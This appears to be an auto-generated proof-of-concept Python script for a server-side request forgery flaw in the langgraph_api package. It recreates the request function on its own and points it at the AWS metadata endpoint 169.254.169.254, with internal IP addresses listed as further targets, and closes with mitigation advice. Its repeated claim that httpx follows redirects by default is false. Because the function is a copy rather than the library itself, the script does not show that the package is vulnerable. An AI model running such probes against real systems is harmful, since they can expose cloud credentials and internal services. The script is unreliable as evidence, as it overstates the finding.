#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: ssrf-008
# Sink: _make_http_request_with_retries
# Auto-generated — run with: python3 ssrf_url_makes_http_request__make_http_request_with_retries.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_api _make_http_request_with_retries

This script demonstrates that the _make_http_request_with_retries function
makes HTTP requests to arbitrary URLs without validation, including internal
services. The function follows redirects by default, allowing an attacker to
bypass initial URL checks.

Vulnerability: SSRF (Server-Side Request Forgery)
Impact: Access to internal services, cloud metadata endpoints, etc.
"""

import asyncio
import httpx
import sys
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Target configuration - CHANGE THESE for your testing environment
TARGET_URL = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint (benign read)
# Alternative targets for testing:
# TARGET_URL = "http://127.0.0.1:8080"  # Local service
# TARGET_URL = "http://10.0.0.1"  # Internal network

# The vulnerable function from langgraph_api (recreated for standalone testing)
async def _make_http_request_with_retries(
    url: str,
    headers: dict = None,
    method: str = "GET",
    json_data: dict = None,
    max_retries: int = 2,
    base_delay: float = 1.0
) -> httpx.Response:
    """
    Vulnerable HTTP request function - no URL validation, follows redirects.
    This is the exact logic from langgraph_api/utils/retriable_client.py
    """
    for attempt in range(max_retries + 1):
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                logger.info(f"Attempt {attempt + 1}: Making {method} request to {url}")
                response = await client.request(
                    method, url, headers=headers, json=json_data
                )
                response.raise_for_status()
                logger.info(f"Request succeeded! Status: {response.status_code}")
                return response

        except (
            httpx.TimeoutException,
            httpx.NetworkError,
            httpx.RequestError,
            httpx.HTTPStatusError,
        ) as e:
            if isinstance(e, httpx.HTTPStatusError) and e.response.status_code < 500:
                logger.error(f"Non-retryable error: {e}")
                raise e

            if attempt < max_retries:
                delay = base_delay * (2**attempt)
                logger.warning(
                    f"Request failed: {e}. Retrying in {delay:.1f} seconds..."
                )
                await asyncio.sleep(delay)
            else:
                logger.error(f"Request failed after {max_retries + 1} attempts: {e}")
                raise e

    msg = f"HTTP {method} request to {url} failed: no attempts made"
    raise httpx.RequestError(msg)


async def demonstrate_ssrf():
    """
    Demonstrate the SSRF vulnerability by making a request to an internal endpoint.
    The function will follow redirects if the target returns them.
    """
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_api")
    print("=" * 60)
    print(f"\nTarget URL: {TARGET_URL}")
    print("Note: This attempts to read AWS metadata (benign).")
    print("If not on AWS, the request will fail gracefully.\n")

    try:
        # Make the vulnerable request
        response = await _make_http_request_with_retries(
            url=TARGET_URL,
            method="GET",
            max_retries=1,  # Reduce retries for PoC
            base_delay=0.5
        )
        
        print(f"\n[SUCCESS] Response received!")
        print(f"Status code: {response.status_code}")
        print(f"Response headers: {dict(response.headers)}")
        print(f"Response body (first 500 chars): {response.text[:500]}")
        
        # If we got here, we successfully made a request to an internal service
        print("\n[!] VULNERABILITY CONFIRMED: SSRF is possible!")
        print("    The function made a request to an internal/private URL without validation.")
        
    except httpx.HTTPStatusError as e:
        print(f"\n[INFO] HTTP error: {e.response.status_code} - {e.response.text[:200]}")
        print("    This is expected if the target doesn't exist or returns an error.")
    except httpx.RequestError as e:
        print(f"\n[INFO] Request error: {e}")
        print("    This is expected if the target is unreachable (e.g., not on AWS).")
    except Exception as e:
        print(f"\n[ERROR] Unexpected error: {e}")
        sys.exit(1)


async def demonstrate_redirect_ssrf():
    """
    Demonstrate SSRF via redirect following.
    This simulates an attacker-controlled server that redirects to an internal service.
    """
    print("\n" + "=" * 60)
    print("Demonstrating SSRF via Redirect Following")
    print("=" * 60)
    print("\nNote: This requires an attacker-controlled server that returns a redirect.")
    print("For testing, you can use a service like webhook.site or set up a local server.")
    print("Example: Start a server that returns 302 redirect to http://127.0.0.1:8080\n")
    
    # This is a conceptual demonstration - in a real attack, the attacker would:
    # 1. Set up a server that returns a 302 redirect to an internal IP
    # 2. The vulnerable function would follow the redirect without validation
    # 3. Access internal services
    
    print("[!] IMPORTANT: httpx follows redirects by default!")
    print("    Even if the initial URL is validated, a redirect to an internal")
    print("    IP would bypass the check and access internal services.\n")


async def main():
    """Main function to run the PoC demonstrations."""
    print("Starting SSRF Proof-of-Concept...\n")
    
    # Demonstrate basic SSRF
    await demonstrate_ssrf()
    
    # Demonstrate redirect-based SSRF
    await demonstrate_redirect_ssrf()
    
    print("\n" + "=" * 60)
    print("PoC Complete")
    print("=" * 60)
    print("\nSummary:")
    print("- The _make_http_request_with_retries function does NOT validate URLs")
    print("- It follows redirects by default (httpx default behavior)")
    print("- An attacker can make requests to internal services")
    print("- Cloud metadata endpoints (169.254.169.254) are accessible")
    print("- Internal services on private IPs (10.x.x.x, 172.16-31.x.x, 192.168.x.x) are accessible")
    print("\nMitigation:")
    print("- Validate URLs against an allowlist of allowed hosts/IPs")
    print("- Block private IP ranges (RFC 1918) and cloud metadata IPs")
    print("- Disable redirect following or validate redirect targets")
    print("- Use a URL parser that matches the HTTP client's behavior")


if __name__ == "__main__":
    asyncio.run(main())
